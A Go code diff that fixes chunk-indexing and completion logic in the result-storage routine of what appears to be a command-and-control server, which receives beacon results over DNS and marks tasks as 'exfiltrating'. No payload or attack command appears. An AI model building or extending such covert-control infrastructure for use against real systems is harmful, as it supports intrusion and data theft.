@@ -988,8 +988,13 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 
 	// Determine if this is a complete result
 	isComplete := 0
-	if chunkIndex == 0 {
-		// Either single-chunk (totalChunks=1) or assembled result (totalChunks>1)
+	// Single-chunk results: chunkIndex=1, totalChunks=1 (1-indexed from DNS servers)
+	// Assembled results: chunkIndex=0, totalChunks>1 (0-indexed for assembled data)
+	if chunkIndex == 1 && totalChunks == 1 {
+		// Single-chunk result from DNS server (1-indexed)
+		isComplete = 1
+	} else if chunkIndex == 0 {
+		// Either assembled result (totalChunks>1) or legacy 0-indexed single chunk
 		isComplete = 1
 
 		// If this is an assembled result from a DNS server, store it and we're done
@@ -1037,12 +1042,18 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 		return err
 	}
 
-	if chunkIndex > 0 && totalChunks > 1 {
-		fmt.Printf("[Master DB] Saved chunk %d/%d for task %s from %s\n", chunkIndex, totalChunks, taskID, dnsServerID)
+	if chunkIndex >= 1 {
+		if totalChunks == 1 {
+			fmt.Printf("[Master DB] Saved single-chunk result for task %s from %s (%d bytes)\n", taskID, dnsServerID, len(data))
+		} else {
+			fmt.Printf("[Master DB] Saved chunk %d/%d for task %s from %s\n", chunkIndex, totalChunks, taskID, dnsServerID)
+		}
 	}
 
 	// Update task status to "exfiltrating" when first chunk arrives (unless it's already completed)
-	if chunkIndex > 0 || (chunkIndex == 0 && totalChunks == 1) {
+	// For 1-indexed chunks: chunkIndex >= 1
+	// For 0-indexed assembled: chunkIndex == 0 and totalChunks > 1
+	if chunkIndex >= 1 || (chunkIndex == 0 && totalChunks > 1) {
 		var currentStatus string
 		err := d.db.QueryRow("SELECT status FROM tasks WHERE id = ?", taskID).Scan(&currentStatus)
 		if err == nil && currentStatus == "sent" {
@@ -1055,7 +1066,7 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 	}
 
 	// If this was a complete single-chunk result, mark task as completed
-	if isComplete == 1 && totalChunks == 1 {
+	if isComplete == 1 {
 		d.markTaskCompleted(taskID)
 	}
 
